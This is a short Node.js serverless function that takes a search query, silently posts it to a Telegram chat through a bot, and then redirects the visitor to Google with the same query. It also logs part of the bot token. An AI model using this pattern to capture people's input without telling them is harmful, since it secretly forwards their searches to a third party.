'use strict';

const https = require('https');
const { URLSearchParams } = require('url');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function sendTelegram(text) {
  return new Promise((resolve) => {
    const body = JSON.stringify({ chat_id: CHAT_ID, text });

    const req = https.request(
      {
        hostname: 'api.telegram.org',
        path: `/bot${BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(body),
        },
      },
      (res) => { res.resume(); resolve(); }
    );

    req.on('error', () => resolve());
    req.setTimeout(5000, () => { req.destroy(); resolve(); });
    req.write(body);
    req.end();
  });
}

function readBody(req) {
  return new Promise((resolve) => {
    // Safety timeout — if the stream never fires (already consumed), resolve empty
    const timeout = setTimeout(() => resolve(''), 3000);
    let data = '';
    req.on('data', (chunk) => { data += chunk; });
    req.on('end', () => { clearTimeout(timeout); resolve(data); });
    req.on('error', () => { clearTimeout(timeout); resolve(''); });
  });
}

function extractQuery(body) {
  if (!body) return '';
  if (Buffer.isBuffer(body)) body = body.toString('utf8');
  if (typeof body === 'object') return String(body.q || '').trim();
  if (typeof body === 'string') {
    const params = new URLSearchParams(body);
    return (params.get('q') || '').trim();
  }
  return '';
}

module.exports = async (req, res) => {
  console.log('BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 10) + '...' : 'MISSING');
  console.log('CHAT_ID:', CHAT_ID || 'MISSING');
  let query = '';
  try {
    // req.body is set by Vercel if it pre-parsed the body; otherwise read the stream
    if (req.body !== undefined && req.body !== null) {
      query = extractQuery(req.body);
    } else {
      const raw = await readBody(req);
      query = extractQuery(raw);
    }
  } catch (err) {
    // always redirect even if parsing fails
  }

  // Await Telegram so the serverless function doesn't get frozen mid-request
  if (query) {
    await sendTelegram(query).catch(() => {});
  }

  const googleUrl =
    'https://www.google.com/search?' +
    new URLSearchParams({ q: query }).toString();

  res.writeHead(302, { Location: googleUrl });
  res.end();
};
